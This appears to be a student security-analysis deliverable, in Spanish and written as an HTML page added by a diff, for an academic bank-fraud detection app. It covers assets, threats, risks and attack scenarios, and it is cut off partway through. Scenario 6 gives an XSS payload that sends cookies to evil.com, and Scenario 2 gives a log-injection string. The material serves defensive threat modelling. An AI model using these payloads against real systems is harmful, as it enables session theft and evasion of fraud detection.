@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8"/>
+<title>Entregable 2 — Análisis de Seguridad · DetecciónAnomalíasBancarias</title>
+<style>
+  /* ── Base ── */
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: "Segoe UI", Arial, sans-serif; font-size: 11pt; color: #111;
+         max-width: 1100px; margin: 0 auto; padding: 24px 32px; line-height: 1.55; }
+
+  /* ── Headings ── */
+  h1 { font-size: 18pt; color: #1e3a5f; border-bottom: 3px solid #1e3a5f;
+       padding-bottom: 6px; margin: 32px 0 12px; }
+  h2 { font-size: 14pt; color: #1e3a5f; border-left: 4px solid #2563eb;
+       padding-left: 10px; margin: 28px 0 10px; }
+  h3 { font-size: 12pt; color: #1e4d8c; margin: 20px 0 6px; }
+  h4 { font-size: 11pt; color: #374151; margin: 14px 0 4px; font-style: italic; }
+
+  /* ── Tables ── */
+  table { width: 100%; border-collapse: collapse; margin: 10px 0 20px; font-size: 10pt; }
+  th { background: #1e3a5f; color: #fff; padding: 7px 9px; text-align: left; }
+  td { padding: 6px 9px; border: 1px solid #d1d5db; vertical-align: top; }
+  tr:nth-child(even) td { background: #f0f4fa; }
+
+  /* ── Severity colours ── */
+  .critica { color: #b91c1c; font-weight: 700; }
+  .alta    { color: #d97706; font-weight: 700; }
+  .media   { color: #0369a1; font-weight: 600; }
+  .baja    { color: #374151; }
+
+  /* ── Risk priority ── */
+  .p100 { background: #fee2e2 !important; }
+  .p80  { background: #fef3c7 !important; }
+  .p60  { background: #fffbeb !important; }
+
+  /* ── Misc ── */
+  p  { margin: 6px 0 12px; }
+  ul { padding-left: 20px; margin-bottom: 12px; }
+  li { margin-bottom: 4px; }
+  code { background: #f3f4f6; padding: 1px 5px; border-radius: 3px; font-size: 10pt; }
+  pre  { background: #f3f4f6; padding: 12px; border-radius: 6px; font-size: 9.5pt;
+         overflow-x: auto; margin: 8px 0 14px; white-space: pre-wrap; }
+  .cover-table td { border: none; padding: 4px 10px; }
+  .section-tag { display: inline-block; background: #1e3a5f; color: #fff;
+                 font-size: 9pt; padding: 2px 8px; border-radius: 3px; margin-right: 6px; }
+  .note { background: #fffbeb; border-left: 4px solid #f59e0b; padding: 8px 12px;
+          margin: 10px 0; font-size: 10pt; }
+  .blocker { background: #fee2e2; border-left: 4px solid #b91c1c; padding: 10px 14px;
+             margin: 12px 0; }
+
+  /* ── Print ── */
+  @media print {
+    body { max-width: 100%; padding: 0; font-size: 10pt; }
+    h1   { font-size: 15pt; page-break-before: always; }
+    h1:first-of-type { page-break-before: avoid; }
+    h2   { font-size: 12pt; }
+    table { font-size: 9pt; page-break-inside: avoid; }
+    pre  { font-size: 8.5pt; }
+    .no-print { display: none; }
+    a { text-decoration: none; color: inherit; }
+  }
+  /* ── Print button ── */
+  .print-btn { position: fixed; top: 16px; right: 16px; background: #2563eb; color: #fff;
+               border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer;
+               font-size: 11pt; z-index: 100; }
+  .print-btn:hover { background: #1d4ed8; }
+</style>
+</head>
+<body>
+
+<button class="print-btn no-print" onclick="window.print()">⬇ Guardar PDF</button>
+
+<!-- ================================================================
+     PORTADA
+================================================================ -->
+<h1 style="border:none; font-size:22pt; text-align:center; margin-top:0;">
+  Entregable 2 — Análisis de Seguridad
+</h1>
+<p style="text-align:center; font-size:14pt; color:#374151; margin-bottom:24px;">
+  DetecciónAnomalíasBancarias
+</p>
+
+<table class="cover-table" style="width:60%; margin: 0 auto 32px;">
+  <tr><td><strong>Aplicación</strong></td><td>DetecciónAnomalíasBancarias</td></tr>
+  <tr><td><strong>Versión</strong></td><td>0.3 — 25/05/2026</td></tr>
+  <tr><td><strong>Ámbito</strong></td><td>Sistema académico de detección de fraude bancario sobre logs sintéticos</td></tr>
+  <tr><td><strong>Tecnología</strong></td><td>Java 17 · Spring Boot 3.2 · Spring Security · JPA / H2 · HTML/CSS/JS</td></tr>
+  <tr><td><strong>Equipo</strong></td><td>Juan Carlos (generador) · Adrián (detector) · Javier (panel) · Kike (coordinación)</td></tr>
+  <tr><td><strong>Fecha</strong></td><td>25/05/2026</td></tr>
+</table>
+
+<!-- ================================================================
+     TAREA 1 — INVENTARIO DE ACTIVOS
+================================================================ -->
+<h1>Tarea 1 — Inventario de activos</h1>
+
+<table>
+  <thead>
+    <tr><th>ID</th><th>Activo</th><th>Tipo</th><th>Propietario</th>
+        <th>Conf.</th><th>Integ.</th><th>Disp.</th><th>Observaciones</th></tr>
+  </thead>
+  <tbody>
+    <tr><td>A-01</td><td><code>transacciones.log</code> — CSV pipe-separated, 100 000 filas</td><td>Dato</td><td>Juan Carlos</td><td class="alta">ALTA</td><td class="critica">CRÍTICA</td><td class="alta">ALTA</td><td>Sin contraseñas; contiene datos financieros sintéticos</td></tr>
+    <tr><td>A-02</td><td><code>sesiones.log</code> — CSV pipe-separated, 20 000 filas</td><td>Dato</td><td>Juan Carlos</td><td class="alta">ALTA</td><td class="alta">ALTA</td><td class="alta">ALTA</td><td>Correlaciona con A-01 para ANO-016/017/019</td></tr>
+    <tr><td>A-03</td><td><code>verdad_oculta.csv</code> — mapa transaction_id→fraude</td><td>Dato</td><td>Juan Carlos</td><td class="critica">CRÍTICA</td><td class="critica">CRÍTICA</td><td class="media">MEDIA</td><td><strong>Nunca se sube al repositorio</strong></td></tr>
+    <tr><td>A-04</td><td>BD <code>anomalias_detectadas</code> (H2/MySQL)</td><td>Dato</td><td>Adrián</td><td class="alta">ALTA</td><td class="alta">ALTA</td><td class="alta">ALTA</td><td>Dev: H2 en memoria; prod: MySQL con credenciales externas</td></tr>
+    <tr><td>A-05</td><td>Panel de auditoría — JAR Spring Boot + frontend HTML</td><td>Servicio</td><td>Javier</td><td class="media">MEDIA</td><td class="alta">ALTA</td><td class="alta">ALTA</td><td>Expone <code>/api/banking/*</code> y <code>/api/logs/*</code></td></tr>
+    <tr><td>A-06</td><td>Código fuente detector — reglas ANO-001..054</td><td>Código</td><td>Adrián</td><td class="media">MEDIA</td><td class="alta">ALTA</td><td class="alta">ALTA</td><td>Si se expone, el atacante aprende a evadir la detección</td></tr>
+    <tr><td>A-07</td><td>Credenciales BD (<code>DB_PASS</code>, keystore, <code>.env</code>)</td><td>Secreto</td><td>Kike</td><td class="critica">CRÍTICA</td><td class="critica">CRÍTICA</td><td class="alta">ALTA</td><td>Solo en variables de entorno; <strong>nunca en el repositorio</strong></td></tr>
+    <tr><td>A-08</td><td>Configuración (<code>application.properties</code>)</td><td>Configuración</td><td>Kike</td><td class="alta">ALTA</td><td class="alta">ALTA</td><td class="alta">ALTA</td><td>El fichero de prod está en <code>.gitignore</code></td></tr>
+    <tr><td>A-09</td><td>API REST del panel (<code>/api/banking/*</code>, <code>/api/logs/*</code>)</td><td>Servicio</td><td>Javier</td><td class="alta">ALTA</td><td class="alta">ALTA</td><td class="alta">ALTA</td><td>Sin autenticación en v0.3: riesgo IDOR y DoS activos</td></tr>
+    <tr><td>A-10</td><td>Infraestructura JVM (SO, puerto 8080)</td><td>Infraestructura</td><td>Kike</td><td class="media">MEDIA</td><td class="alta">ALTA</td><td class="critica">CRÍTICA</td><td>Si el proceso cae, panel e ingesta se detienen</td></tr>
+  </tbody>
+</table>
+
+<!-- ================================================================
+     TAREA 2 — ANÁLISIS AMENAZA / VULNERABILIDAD / RIESGO / IMPACTO / CONTROL
+================================================================ -->
+<h1>Tarea 2 — Amenaza / Vulnerabilidad / Riesgo / Impacto / Control</h1>
+
+<h2>Módulo generador (<code>/generador</code>)</h2>
+<table>
+  <thead><tr><th>#</th><th>Amenaza</th><th>Vulnerabilidad</th><th>Riesgo</th><th>Impacto</th><th>Control propuesto</th></tr></thead>
+  <tbody>
+    <tr><td>2.1</td><td>Subir <code>verdad_oculta.csv</code> al repo por accidente</td><td>No está en <code>.gitignore</code>; sin pre-commit hook</td><td>Profesor descarga la solución antes de la evaluación</td><td class="critica">CRÍTICO: invalida la evaluación</td><td><code>verdad_oculta*.csv</code> en <code>.gitignore</code>; pre-commit hook con <code>git-secrets</code></td></tr>
+    <tr><td>2.2</td><td>Timestamp manipulado en logs generados</td><td>Generador no valida rango temporal</td><td>El detector genera falsos positivos masivos</td><td class="alta">ALTO: degrada precisión y recall</td><td>El generador firma con hash el bloque de logs; el detector verifica la firma</td></tr>
+    <tr><td>2.3</td><td>Log injection: campo <code>concepto</code> con <code>|</code> o <code>\n</code></td><td>Falta de sanitización al escribir el CSV</td><td>El detector parsea mal la fila y puede saltarse la detección</td><td class="alta">ALTO: evasión del detector</td><td>Escapar o rechazar <code>|</code> y <code>\n</code> en <code>concepto</code></td></tr>
+  </tbody>
+</table>
+
+<h2>Módulo detector (<code>/detector</code>)</h2>
+<table>
+  <thead><tr><th>#</th><th>Amenaza</th><th>Vulnerabilidad</th><th>Riesgo</th><th>Impacto</th><th>Control propuesto</th></tr></thead>
+  <tbody>
+    <tr><td>2.4</td><td>SQL injection vía campo <code>concepto</code> en queries nativas</td><td>Concatenación de strings en lugar de parámetros preparados</td><td>Acceso o destrucción de la BD de anomalías</td><td class="alta">ALTO</td><td><code>@Query</code> con parámetros o <code>PreparedStatement</code></td></tr>
+    <tr><td>2.5</td><td>Adversarial evasion: atacante conoce las reglas</td><td>Código fuente público con umbrales fijos</td><td>El atacante ajusta sus transacciones para no disparar ninguna regla</td><td class="alta">ALTO</td><td>Repositorio privado para <code>/detector</code>; umbrales en configuración externa</td></tr>
+    <tr><td>2.6</td><td>Doble procesamiento de la misma fila de log</td><td>Sin control de idempotencia</td><td>Duplicidad en <code>anomalias_detectadas</code></td><td class="media">MEDIO</td><td>Registrar hash SHA-256 del fichero procesado; rechazar refeed</td></tr>
+  </tbody>
+</table>
+
+<h2>Módulo panel (<code>/panel</code>)</h2>
+<table>
+  <thead><tr><th>#</th><th>Amenaza</th><th>Vulnerabilidad</th><th>Riesgo</th><th>Impacto</th><th>Control propuesto</th></tr></thead>
+  <tbody>
+    <tr><td>2.7</td><td>IDOR — auditor consulta anomalías de otra sucursal</td><td>Endpoint <code>GET /api/logs/recent</code> sin filtro por usuario</td><td>Un auditor lee datos de otra sucursal</td><td class="critica">CRÍTICO (OWASP API1:2023)</td><td><code>@PreAuthorize</code> con <code>sucursal_id</code> extraído del JWT</td></tr>
+    <tr><td>2.8</td><td>Fuerza bruta al login del panel</td><td>Sin límite de intentos de autenticación</td><td>Compromiso de cuenta de auditor</td><td class="alta">ALTO</td><td>Bloqueo tras 5 intentos; <code>BruteForceProtectionFilter</code></td></tr>
+    <tr><td>2.9</td><td>XSS persistente vía campo <code>concepto</code></td><td>Dashboard renderiza el campo con <code>innerHTML</code></td><td>Script malicioso en el navegador del auditor</td><td class="alta">ALTO (OWASP A03:2021)</td><td><code>textContent</code> en lugar de <code>innerHTML</code>; CSP header</td></tr>
+    <tr><td>2.10</td><td>DoS sobre <code>POST /api/banking/batch</code></td><td>Sin límite de tamaño de cuerpo ni tasa de peticiones</td><td>Agotamiento de memoria JVM</td><td class="alta">ALTO</td><td><code>max-request-size=10MB</code>; rate limiter</td></tr>
+    <tr><td>2.11</td><td>Spring Actuator expuesto en producción</td><td><code>exposure.include=*</code> sin autenticación</td><td><code>/actuator/env</code> expone credenciales</td><td class="alta">ALTO</td><td>En prod: <code>include=health,info</code>; puerto separado</td></tr>
+  </tbody>
+</table>
+
+<h2>Datos y credenciales</h2>
+<table>
+  <thead><tr><th>#</th><th>Amenaza</th><th>Vulnerabilidad</th><th>Riesgo</th><th>Impacto</th><th>Control propuesto</th></tr></thead>
+  <tbody>
+    <tr><td>2.12</td><td>Contraseña de BD hardcodeada en <code>application.properties</code></td><td>Falta de revisión pre-commit</td><td>Acceso completo a la BD por cualquier persona con acceso al repo</td><td class="critica">CRÍTICO</td><td><code>${DB_PASS}</code> en properties; pre-commit hook; rotación si hay exposición</td></tr>
+    <tr><td>2.13</td><td>Datos de clientes en logs sin seudonimizar</td><td>Logs con NIF, nombre o IBAN reales</td><td>Violación del RGPD Art. 32</td><td class="alta">ALTO (legal)</td><td>Tokenización de IBAN; cuentas ficticias en este proyecto</td></tr>
+    <tr><td>2.14</td><td>Backup de BD sin cifrar</td><td>Fichero H2 sin contraseña por defecto</td><td>Exfiltración de todas las anomalías detectadas</td><td class="alta">ALTO</td><td>Cifrar con <code>CIPHER=AES</code> en H2; TDE en MySQL</td></tr>
+  </tbody>
+</table>
+
+<!-- ================================================================
+     TAREA 3 — MATRIZ MÓDULOS × DIMENSIONES DE SEGURIDAD
+================================================================ -->
+<h1>Tarea 3 — Matriz módulos × dimensiones de seguridad</h1>
+<p><em>Escala: ✅ cubierta · ⚠ parcial · ❌ no cubierta · N/A no aplica</em></p>
+
+<table>
+  <thead>
+    <tr><th>Módulo / Activo</th><th>Confidencialidad</th><th>Integridad</th><th>Disponibilidad</th>
+        <th>Autenticación</th><th>Autorización</th><th>No repudio</th><th>Trazabilidad</th></tr>
+  </thead>
+  <tbody>
+    <tr><td><strong>Generador (<code>/generador</code>)</strong></td><td>⚠ logs sin seudonimizar</td><td>⚠ sin firma de logs</td><td>✅ proceso batch</td><td>N/A</td><td>N/A</td><td>⚠ sin hash de integridad</td><td>⚠ sin registro de fichero</td></tr>
+    <tr><td><strong>Detector (<code>/detector</code>)</strong></td><td>⚠ reglas expuestas en repo</td><td>⚠ sin idempotencia</td><td>⚠ sin reintentos si falla BD</td><td>N/A</td><td>N/A</td><td>⚠ no registra quién lanzó el análisis</td><td>✅ escribe en <code>anomalias_detectadas</code> con timestamp</td></tr>
+    <tr><td><strong>Panel (<code>/panel</code>)</strong></td><td>⚠ sin HTTPS por defecto</td><td>✅ Spring Security</td><td>⚠ nodo único, sin HA</td><td>❌ endpoints sin auth real en v0.3</td><td>❌ sin RBAC</td><td>⚠ sin log de acciones del auditor</td><td>✅ logs a consola; alertas en BD</td></tr>
+    <tr><td><strong>BD <code>anomalias_detectadas</code></strong></td><td>⚠ H2 sin cifrado en disco</td><td>✅ JPA + constraints SQL</td><td>⚠ H2 en memoria se pierde al reiniciar</td><td>✅ solo accesible desde la app</td><td>✅ sin acceso externo directo</td><td>⚠ sin audit log de cambios</td><td>✅ timestamp en cada fila</td></tr>
+    <tr><td><strong><code>transacciones.log</code></strong></td><td>⚠ IPs y cuentas en claro</td><td>❌ sin firma; modificable sin detección</td><td>✅ fichero local</td><td>N/A</td><td>N/A</td><td>❌ sin hash</td><td>✅ timestamp y transaction_id por fila</td></tr>
+    <tr><td><strong><code>sesiones.log</code></strong></td><td>⚠ IPs y dispositivos en claro</td><td>❌ sin firma</td><td>✅</td><td>N/A</td><td>N/A</td><td>❌</td><td>✅</td></tr>
+    <tr><td><strong><code>verdad_oculta.csv</code></strong></td><td>❌ en riesgo si se sube al repo</td><td class="critica">CRÍTICA — define la evaluación</td><td class="media">MEDIA — solo para el evaluador</td><td>N/A</td><td>N/A</td><td>N/A</td><td>N/A</td></tr>
+  </tbody>
+</table>
+
+<!-- ================================================================
+     TAREA 4 — CATÁLOGO DE RIESGOS R01–R20
+================================================================ -->
+<h1>Tarea 4 — Catálogo de riesgos (R01–R20)</h1>
+
+<table>
+  <thead>
+    <tr><th>Código</th><th>Descripción</th><th>Activo</th><th>Dimensiones</th>
+        <th>Prob.</th><th>Impacto</th><th>Severidad</th></tr>
+  </thead>
+  <tbody>
+    <tr class="p100"><td>R01</td><td>IDOR en panel: auditor accede a datos de otra sucursal</td><td>A-09</td><td>Confidencialidad, Autorización</td><td>4</td><td>5</td><td class="critica">CRÍTICO</td></tr>
+    <tr><td>R02</td><td>Log injection: <code>concepto</code> inyecta líneas falsas en CSV</td><td>A-01</td><td>Integridad, Trazabilidad</td><td>3</td><td>4</td><td class="alta">ALTO</td></tr>
+    <tr class="p100"><td>R03</td><td>Verdad oculta subida al repositorio por accidente</td><td>A-03</td><td>Confidencialidad</td><td>3</td><td>5</td><td class="critica">CRÍTICO</td></tr>
+    <tr class="p100"><td>R04</td><td>Credenciales hardcoded en <code>application.properties</code> en el repo</td><td>A-07</td><td>Confidencialidad, Autenticación</td><td>4</td><td>5</td><td class="critica">CRÍTICO</td></tr>
+    <tr><td>R05</td><td>Spring Actuator expuesto en producción sin autenticación</td><td>A-05, A-07</td><td>Confidencialidad, Disponibilidad</td><td>3</td><td>4</td><td class="alta">ALTO</td></tr>
+    <tr><td>R06</td><td>DoS sobre <code>POST /api/banking/batch</code> sin límite de tamaño</td><td>A-09, A-10</td><td>Disponibilidad</td><td>3</td><td>4</td><td class="alta">ALTO</td></tr>
+    <tr><td>R07</td><td>SQL injection vía campo <code>concepto</code> en queries nativas</td><td>A-04</td><td>Integridad, Confidencialidad</td><td>2</td><td>5</td><td class="alta">ALTO</td></tr>
+    <tr><td>R08</td><td>Sesión del auditor robada — JWT sin expiración o exfiltrado</td><td>A-05</td><td>Autenticación, Autorización</td><td>3</td><td>4</td><td class="alta">ALTO</td></tr>
+    <tr><td>R09</td><td>Fuerza bruta al panel sin rate-limit</td><td>A-05</td><td>Autenticación</td><td>4</td><td>4</td><td class="alta">ALTO</td></tr>
+    <tr><td>R10</td><td>Datos sensibles de clientes en logs sin seudonimizar</td><td>A-01, A-02</td><td>Confidencialidad</td><td>2</td><td>4</td><td class="alta">ALTO</td></tr>
+    <tr class="p100"><td>R11</td><td>Endpoints del panel sin autenticación en v0.3</td><td>A-09</td><td>Autenticación, Autorización</td><td>5</td><td>5</td><td class="critica">CRÍTICO</td></tr>
+    <tr><td>R12</td><td>Reglas de detección expuestas en repo (adversarial evasion)</td><td>A-06</td><td>Confidencialidad</td><td>3</td><td>4</td><td class="alta">ALTO</td></tr>
+    <tr><td>R13</td><td>Backup de BD sin cifrar</td><td>A-04</td><td>Confidencialidad</td><td>2</td><td>5</td><td class="alta">ALTO</td></tr>
+    <tr><td>R14</td><td>Dependencias Maven vulnerables sin parchear</td><td>A-05, A-06</td><td>Integridad, Disponibilidad</td><td>3</td><td>3</td><td class="media">MEDIO</td></tr>
+    <tr><td>R15</td><td>Sin cifrado de datos en reposo — H2 sin <code>CIPHER=AES</code></td><td>A-04</td><td>Confidencialidad</td><td>3</td><td>4</td><td class="alta">ALTO</td></tr>
+    <tr><td>R16</td><td>Gap temporal en logs: bloques sin eventos durante horas (ANO-036)</td><td>A-01</td><td>Integridad, Trazabilidad</td><td>3</td><td>4</td><td class="alta">ALTO</td></tr>
+    <tr><td>R17</td><td>Sin paginación en <code>GET /api/logs/recent</code> — volcado total posible</td><td>A-09</td><td>Disponibilidad, Confidencialidad</td><td>4</td><td>3</td><td class="media">MEDIO</td></tr>
+    <tr><td>R18</td><td>Sin HTTPS en el panel — tráfico en claro</td><td>A-05, A-09</td><td>Confidencialidad, Autenticación</td><td>3</td><td>4</td><td class="alta">ALTO</td></tr>
+    <tr><td>R19</td><td>Sin separación de entornos dev/prod — misma config</td><td>A-08</td><td>Confidencialidad, Integridad</td><td>4</td><td>4</td><td class="alta">ALTO</td></tr>
+    <tr><td>R20</td><td>Sin idempotencia en la ingestión — misma fila procesada dos veces</td><td>A-04</td><td>Integridad</td><td>3</td><td>3</td><td class="media">MEDIO</td></tr>
+  </tbody>
+</table>
+
+<!-- ================================================================
+     TAREA 5 — PRINCIPIOS DE SEGURIDAD
+================================================================ -->
+<h1>Tarea 5 — Principios reales de seguridad aplicados al proyecto</h1>
+
+<h3>P-01 — Principio del coste</h3>
+<p><em>Un atacante solo ataca si el beneficio esperado supera el coste del ataque.</em></p>
+<p>Los datos sintéticos no tienen valor económico real para un atacante externo. Sin embargo, existe un incentivo académico claro: conocer <code>verdad_oculta.csv</code> antes de la corrección invalida la evaluación con coste prácticamente cero si el fichero está en el repositorio público. <strong>Control directo:</strong> <code>verdad_oculta*.csv</code> en <code>.gitignore</code> + pre-commit hook que detecte el fichero antes del push.</p>
+
+<h3>P-02 — Principio de la imposibilidad</h3>
+<p><em>Ningún sistema es 100% seguro; el objetivo es elevar suficientemente el coste del ataque.</em></p>
+<p>El detector ANO-001..054 no puede detectar el 100% de los fraudes; siempre habrá evasiones creativas (R12). La meta es maximizar el recall minimizando los falsos positivos. El diseño acepta la imperfección y la cuantifica con TP/FP/FN usando <code>verdad_oculta.csv</code> como referencia.</p>
+
+<h3>P-03 — Principio de la proporcionalidad</h3>
+<p><em>Los controles deben ser proporcionales al valor del activo y al riesgo real.</em></p>
+<p><code>verdad_oculta.csv</code> (A-03) requiere máximo control: exclusión del repo, cifrado local, acceso solo al generador y al profesor. Los logs de transacciones (A-01) requieren control alto pero no cifrado: contienen cuentas ficticias sin datos personales reales.</p>
+
+<h3>P-04 — Principio de la redundancia (defensa en profundidad)</h3>
+<p><em>Múltiples capas de seguridad independientes; si falla una, las demás aguantan.</em></p>
+<p>Para proteger las credenciales de BD se aplican tres capas: (1) <code>${DB_PASS}</code> en variables de entorno, (2) Spring Security bloqueando el acceso a <code>/h2-console</code> en prod, (3) <code>application-prod.properties</code> fuera del repo y en <code>.gitignore</code>.</p>
+
+<h3>P-05 — Principio de la asimetría</h3>
+<p><em>El defensor debe cubrirse en todos los frentes; el atacante solo necesita encontrar uno.</em></p>
+<p>El panel tiene 6 endpoints. Si se protegen 5 con autenticación y se olvida uno (<code>/api/banking/upload-csv</code>), el atacante inyecta logs falsos por ese único punto no protegido. <strong>Implicación:</strong> todos los endpoints deben requerir autenticación.</p>
+
+<h3>P-06 — Principio de la incomodidad</h3>
+<p><em>La seguridad añade fricción; debe calibrarse para no bloquear el uso legítimo.</em></p>
+<p>El rate-limit en <code>/api/banking/batch</code> (100 peticiones/minuto) incomoda a un atacante DoS, pero no interfiere con el uso normal del panel de auditoría, que procesa ficheros de logs de forma puntual y espaciada.</p>
+
+<h3>P-07 — Principio del conocimiento del mal (conoce a tu adversario)</h3>
+<p><em>Para defenderte tienes que entender cómo ataca el adversario.</em></p>
+<p>El catálogo ANO-001..054 es la materialización de este principio. Antes de construir el detector, el equipo catalogó explícitamente 54 patrones de fraude bancario conocidos: blanqueo, cuentas mula, velocidad inusual, integridad de logs, fraude externo, normativa, insider threat.</p>
+
+<h3>P-08 — Principio del privilegio mínimo</h3>
+<p><em>Cada componente recibe solo los permisos estrictamente necesarios para su función.</em></p>
+<p>El usuario de BD del detector tiene <code>INSERT</code> en <code>anomalias_detectadas</code> y <code>SELECT</code> en <code>transacciones</code>; no tiene <code>DROP</code>, <code>ALTER</code> ni acceso a otras tablas. El panel no tiene acceso directo al fichero de logs.</p>
+
+<h3>P-09 — Principio de la sospecha (zero trust)</h3>
+<p><em>No confíes por defecto en ningún input; valida todo en el perímetro del sistema.</em></p>
+<p>El endpoint <code>POST /api/banking/upload-csv</code> recibe un fichero del exterior. No se asume que viene bien formado: se valida cada fila, se rechaza si tiene campos críticos vacíos (ANO-031, ANO-034), se escapa el campo <code>concepto</code> antes de procesarlo (ANO-040).</p>
+
+<h3>P-10 — Principio de la resiliencia</h3>
+<p><em>El sistema debe degradarse de forma controlada cuando falla un componente.</em></p>
+<p>Si MySQL falla en producción, el panel cae sobre H2 en memoria (perfil <code>default</code>). Si el detector no puede escribir en BD, registra el error en logs y continúa procesando sin crash silencioso.</p>
+
+<!-- ================================================================
+     TAREA 6 — ESCENARIOS DE ATAQUE O FALLO
+================================================================ -->
+<h1>Tarea 6 — Escenarios de ataque o fallo</h1>
+
+<h2>Escenario 1 — IDOR en el panel de auditoría</h2>
+<table>
+  <tbody>
+    <tr><td><strong>Tipo</strong></td><td>Ataque</td></tr>
+    <tr><td><strong>Actor</strong></td><td>Externo autenticado (auditor de otra sucursal) o interno malicioso</td></tr>
+    <tr><td><strong>Activo afectado</strong></td><td>A-09 (API REST), A-04 (BD anomalías)</td></tr>
+    <tr><td><strong>Amenaza</strong></td><td>Acceso no autorizado a alertas de otra sucursal</td></tr>
+    <tr><td><strong>Vulnerabilidad explotada</strong></td><td>R01 — Endpoints sin filtro por identidad del auditor autenticado</td></tr>
+    <tr><td><strong>Vector de ataque</strong></td><td><code>GET http://host:8080/api/logs/recent?source=sucursal-B</code> desde cuenta de sucursal-A</td></tr>
+    <tr><td><strong>Impacto técnico</strong></td><td>Lectura completa de anomalías detectadas en otras sucursales</td></tr>
+    <tr><td><strong>Impacto en el negocio</strong></td><td>Violación de confidencialidad; posible infracción del RGPD y Ley 10/2010</td></tr>
+    <tr><td><strong>Dimensiones afectadas</strong></td><td>Confidencialidad, Autorización</td></tr>
+    <tr><td><strong>Riesgo asociado</strong></td><td class="critica">R01 (CRÍTICO)</td></tr>
+    <tr><td><strong>Controles recomendados</strong></td><td><code>@PreAuthorize</code> con <code>sucursal_id</code> extraído del JWT; tests de autorización automatizados</td></tr>
+  </tbody>
+</table>
+
+<h2>Escenario 2 — Log injection vía campo concepto</h2>
+<table>
+  <tbody>
+    <tr><td><strong>Tipo</strong></td><td>Ataque</td></tr>
+    <tr><td><strong>Actor</strong></td><td>Externo (atacante que controla una cuenta bancaria de origen)</td></tr>
+    <tr><td><strong>Activo afectado</strong></td><td>A-01 (transacciones.log), A-04 (BD)</td></tr>
+    <tr><td><strong>Vector de ataque</strong></td><td>Transacción con <code>concepto</code> = <code>Pago|COMPLETADA\nFAKE_TX|...</code> rompe el parser CSV del detector</td></tr>
+    <tr><td><strong>Impacto técnico</strong></td><td>El detector parsea una fila adicional falsa o se salta una real</td></tr>
+    <tr><td><strong>Impacto en el negocio</strong></td><td>Evasión del detector; falsos positivos o negativos masivos</td></tr>
+    <tr><td><strong>Dimensiones afectadas</strong></td><td>Integridad, Trazabilidad, No repudio</td></tr>
+    <tr><td><strong>Riesgo asociado</strong></td><td class="alta">R02 (ALTO)</td></tr>
+    <tr><td><strong>Controles recomendados</strong></td><td>Escapar <code>|</code> y <code>\n</code> en <code>concepto</code> al generar; validar número exacto de columnas al parsear</td></tr>
+  </tbody>
+</table>
+
+<h2>Escenario 3 — Fuerza bruta al panel de auditoría</h2>
+<table>
+  <tbody>
+    <tr><td><strong>Tipo</strong></td><td>Ataque</td></tr>
+    <tr><td><strong>Actor</strong></td><td>Externo automatizado (bot)</td></tr>
+    <tr><td><strong>Vector de ataque</strong></td><td>Script que prueba 10 000 contraseñas contra <code>POST /login</code> en cuestión de segundos</td></tr>
+    <tr><td><strong>Impacto técnico</strong></td><td>Acceso completo al panel con la cuenta de auditor comprometida</td></tr>
+    <tr><td><strong>Impacto en el negocio</strong></td><td>El atacante puede marcar alertas como revisadas y enmascarar fraudes reales</td></tr>
+    <tr><td><strong>Dimensiones afectadas</strong></td><td>Autenticación, Autorización, Confidencialidad</td></tr>
+    <tr><td><strong>Riesgo asociado</strong></td><td class="alta">R09 (ALTO)</td></tr>
+    <tr><td><strong>Controles recomendados</strong></td><td>Bloqueo 15 min tras 5 intentos; CAPTCHA; contraseñas mínimo 12 caracteres</td></tr>
+  </tbody>
+</table>
+
+<h2>Escenario 4 — Verdad oculta subida al repositorio por error</h2>
+<table>
+  <tbody>
+    <tr><td><strong>Tipo</strong></td><td>Fallo humano</td></tr>
+    <tr><td><strong>Actor</strong></td><td>Interno accidental (Juan Carlos)</td></tr>
+    <tr><td><strong>Vector de ataque</strong></td><td><code>git add .</code> seguido de <code>git commit</code> sin revisar manualmente qué ficheros se incluyen</td></tr>
+    <tr><td><strong>Impacto en el negocio</strong></td><td>La evaluación del detector queda completamente invalidada; el proyecto pierde valor académico</td></tr>
+    <tr><td><strong>Dimensiones afectadas</strong></td><td>Confidencialidad</td></tr>
+    <tr><td><strong>Riesgo asociado</strong></td><td class="critica">R03 (CRÍTICO)</td></tr>
+    <tr><td><strong>Controles recomendados</strong></td><td><code>verdad_oculta*.csv</code> en <code>.gitignore</code>; pre-commit hook (<code>git-secrets</code>); revisión por Kike antes de aprobar cada PR a main</td></tr>
+  </tbody>
+</table>
+
+<h2>Escenario 5 — Spring Actuator expuesto en producción</h2>
+<table>
+  <tbody>
+    <tr><td><strong>Tipo</strong></td><td>Fallo de configuración</td></tr>
+    <tr><td><strong>Actor</strong></td><td>Externo pasivo (scanner automatizado)</td></tr>
+    <tr><td><strong>Vector de ataque</strong></td><td><code>GET http://host:8080/actuator/env</code> devuelve todas las propiedades si <code>DB_PASS</code> no se externalizó</td></tr>
+    <tr><td><strong>Impacto técnico</strong></td><td>El atacante obtiene las credenciales de BD y las URLs internas</td></tr>
+    <tr><td><strong>Riesgo asociado</strong></td><td class="alta">R05 (ALTO)</td></tr>
+    <tr><td><strong>Controles recomendados</strong></td><td>Prod: <code>include=health,info</code>; Actuator en puerto separado con firewall</td></tr>
+  </tbody>
+</table>
+
+<h2>Escenario 6 — XSS persistente vía campo concepto en el dashboard</h2>
+<table>
+  <tbody>
+    <tr><td><strong>Tipo</strong></td><td>Ataque</td></tr>
+    <tr><td><strong>Actor</strong></td><td>Externo (atacante que sube un CSV malicioso vía API)</td></tr>
+    <tr><td><strong>Vector de ataque</strong></td><td>CSV con <code>concepto</code> = <code>&lt;script&gt;document.location='http://evil.com?c='+document.cookie&lt;/script&gt;</code></td></tr>
+    <tr><td><strong>Impacto técnico</strong></td><td>Robo de JWT del auditor; redirección a sitio de phishing</td></tr>
+    <tr><td><strong>Dimensiones afectadas</strong></td><td>Confidencialidad, Autenticación, Integridad</td></tr>
+    <tr><td><strong>Riesgo asociado</strong></td><td class="alta">R07 (ALTO)</td></tr>
+    <tr><td><strong>Controles recomendados</strong></td><td><code>textContent</code> en lugar de <code>innerHTML</code>; escapar en servidor; <code>Content-Security-Policy: default-src 'self'</code></td></tr>
+  </tbody>
+</table>
+
+<h2>Escenario 7 — DoS sobre endpoint de ingestión masiva</h2>
+<table>
+  <tbody>
+    <tr><td><strong>Tipo</strong></td><td>Ataque</td></tr>
